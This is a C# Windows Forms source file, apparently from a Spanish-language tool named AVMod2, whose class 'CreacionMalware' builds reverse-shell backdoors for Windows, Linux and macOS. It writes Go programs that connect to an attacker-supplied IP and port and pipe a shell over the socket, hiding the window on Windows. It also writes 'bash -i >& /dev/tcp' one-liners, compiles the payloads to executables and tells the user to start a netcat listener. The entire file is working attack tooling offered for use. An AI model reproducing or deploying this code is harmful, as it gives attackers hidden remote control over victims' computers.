using System;
using System.IO;
using System.Windows.Forms;
using System.Diagnostics;
namespace AVMod2
{
    public class CreacionMalware
    {
        private char m = '"';
        private string ipAdress;
        private string comando;
        public string IpAdress
        {
            get { return ipAdress; }
            set { ipAdress = value; }
        }
        private string puerto1;

        public string Puerto1
        {
            get { return puerto1; }
            set { puerto1 = value; }
        }

        private void goWindows()
        {
            StreamWriter BackdoorWindows = new StreamWriter("WindowsBackdoor.go");
            BackdoorWindows.WriteLine("package main");
            BackdoorWindows.WriteLine("import " + m + "os/exec" + m);
            BackdoorWindows.WriteLine("import " + m + "net" + m);
            BackdoorWindows.WriteLine("import " + m + "syscall" + m);
            BackdoorWindows.WriteLine("import " + m + "bufio" + m);
            BackdoorWindows.WriteLine("func main(){");
            BackdoorWindows.WriteLine("    c,_:=net.Dial(" + m + "tcp" + m + "," + m + ipAdress + ":" + puerto1 + m + ");");
            BackdoorWindows.WriteLine("    for{");
            BackdoorWindows.WriteLine(@"        status, _ := bufio.NewReader(c).ReadString('\n');");
            BackdoorWindows.WriteLine("        cmd := exec.Command(" + m + "cmd" + m + "," + m + "/C" + m + ", status)");
            BackdoorWindows.WriteLine("        cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}");
            BackdoorWindows.WriteLine("        out, _ := cmd.Output();");
            BackdoorWindows.WriteLine("        c.Write([]byte(out))");
            BackdoorWindows.WriteLine("    }");
            BackdoorWindows.WriteLine("}");
            BackdoorWindows.Close();
        }
        private void goLinux()
        {
            StreamWriter BackdoorLinux = new StreamWriter("LinuxBackdoor.go");
            BackdoorLinux.WriteLine("package main");
            BackdoorLinux.WriteLine("import " + m + "os/exec" + m);
            BackdoorLinux.WriteLine("import " + m + "net" + m);
            BackdoorLinux.WriteLine("func main(){");
            BackdoorLinux.WriteLine("    c,_:=net.Dial(" + m + "tcp" + m + "," + m + ipAdress + ":" + puerto1 + m + ");");
            BackdoorLinux.WriteLine("	 cmd := exec.Command(" + m + "/bin/sh" + m + ")");
            BackdoorLinux.WriteLine("	 cmd.Stdin = c");
            BackdoorLinux.WriteLine("	 cmd.Stdout = c");
            BackdoorLinux.WriteLine("	 cmd.Stderr = c");
            BackdoorLinux.WriteLine("	 cmd.Run()");
            BackdoorLinux.WriteLine("}");
            BackdoorLinux.Close();
        }
        private void goMac()
        {
            StreamWriter BackdoorLinux = new StreamWriter("MacBackdoor.go");
            BackdoorLinux.WriteLine("package main");
            BackdoorLinux.WriteLine("import " + m + "os/exec" + m);
            BackdoorLinux.WriteLine("import " + m + "net" + m);
            BackdoorLinux.WriteLine("func main(){");
            BackdoorLinux.WriteLine("    c,_:=net.Dial(" + m + "tcp" + m + "," + m + ipAdress + ":" + puerto1 + m + ");");
            BackdoorLinux.WriteLine("	 cmd := exec.Command(" + m + "/bin/sh" + m + ")");
            BackdoorLinux.WriteLine("	 cmd.Stdin = c");
            BackdoorLinux.WriteLine("	 cmd.Stdout = c");
            BackdoorLinux.WriteLine("	 cmd.Stderr = c");
            BackdoorLinux.WriteLine("	 cmd.Run()");
            BackdoorLinux.WriteLine("}");
            BackdoorLinux.Close();
        }
        public void windows()
        {
            try
            {
                goWindows();
                comando = "go build WindowsBackdoor.go";
                DialogResult GoToExe = MessageBox.Show("WindowsBackdoor.go fue creado con exito" + Environment.NewLine + "¿Desea copilarlo a exe?", "¡En hora buena!", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
                if (GoToExe == DialogResult.Yes)
                {
                    ProcessStartInfo processStarInfo = new ProcessStartInfo("cmd", "/c" + comando);
                    processStarInfo.RedirectStandardOutput = true;
                    processStarInfo.UseShellExecute = false;
                    processStarInfo.CreateNoWindow = true;
                    processStarInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    Process proc = new Process();
                    proc.StartInfo = processStarInfo;
                    proc.Start();
                }
                MessageBox.Show("¡Proceso terminado! Inicia NetCat con el siguiente comando." + Environment.NewLine + Environment.NewLine + "nc -l -p " + puerto1 + " -v" + Environment.NewLine + Environment.NewLine + "WindowsBackdoor se encuentra en: " + Environment.NewLine + Environment.CurrentDirectory, "¡Todo a terminado!", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "¡Error inesperado!", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        public void windowsLinux()
        {
            try
            {
                goWindows();
                DialogResult GoToExe = MessageBox.Show("WindowsBackdoor.go fue creado con exito" + Environment.NewLine + "¿Desea copilarlo a exe?", "¡En hora buena!", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
                if (GoToExe == DialogResult.Yes)
                {
                    while (true)
                    {
                        if (!File.Exists("WindowsBackdoor.sh"))
                        {
                            StreamWriter WindowsBackdoorArchivo = new StreamWriter("WindowsBackdoor.sh");
                            WindowsBackdoorArchivo.Write("GOOS=windows GOARCH=386 go build -o WindowsBackdoor.exe WindowsBackdoor.go");
                            WindowsBackdoorArchivo.Close();
                            continue;
                        }
                        else
                        {
                            Process proceso = new Process();
                            proceso.StartInfo.FileName = "bash";
                            proceso.StartInfo.UseShellExecute = false;
                            proceso.StartInfo.Arguments = "WindowsBackdoor.sh";
                            proceso.StartInfo.RedirectStandardOutput = true;
                            proceso.Start();
                            proceso.WaitForExit();
                            proceso.Close();
                            break;
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "¡Error inesperado!", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        public void mac()
        {
            MessageBox.Show("Este Backdoor no ha sido probado aún, si funciona a la perfeccion, por favor, informanos.", "Advertencia", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            try
            {
                StreamWriter BackdoorMac = new StreamWriter("MacBackdoor.sh");
                BackdoorMac.Write("bash -i >& /dev/tcp/" + ipAdress + "/" + puerto1 + " 0>&1");
                BackdoorMac.Close();
                MessageBox.Show("¡Proceso terminado! Inicia NetCat con el siguiente comando." + Environment.NewLine + Environment.NewLine + "nc -l -p " + puerto1 + " -v" + Environment.NewLine + Environment.NewLine + "MacBackdoor se encuentra en: " + Environment.NewLine + Environment.CurrentDirectory, "¡Todo a terminado!", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "¡Error inesperado!", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        public void linux()
        {
            try
            {
                StreamWriter BackdoorLinux = new StreamWriter("LinuxBackdoor.sh");
                BackdoorLinux.Write("bash -i >& /dev/tcp/" + ipAdress + "/" + puerto1 + " 0>&1");
                BackdoorLinux.Close();
                MessageBox.Show("¡Proceso terminado! Inicia NetCat con el siguiente comando." + Environment.NewLine + Environment.NewLine + "nc -l -p " + puerto1 + " -v" + Environment.NewLine + Environment.NewLine + "LinuxBackdoor se encuentra en: " + Environment.NewLine + Environment.CurrentDirectory, "¡Todo a terminado!", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "¡Error inesperado!", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        public void todos()
        {
            //windows
            goWindows();
            //linux
            goLinux();
            //mac
            MessageBox.Show("El Backdoor de Mac no a sido probado aún, si funciona a la perfeccion, por favor, informanos.", "Advertencia", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            goMac();
            MessageBox.Show("¡Proceso terminado! Inicia NetCat con el siguiente comando." + Environment.NewLine + Environment.NewLine + "nc -l -p " + puerto1 + " -v" + Environment.NewLine + Environment.NewLine + "Los backdoors estan en: " + Environment.NewLine + Environment.CurrentDirectory, "¡Todo a terminado!", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }
    }
}
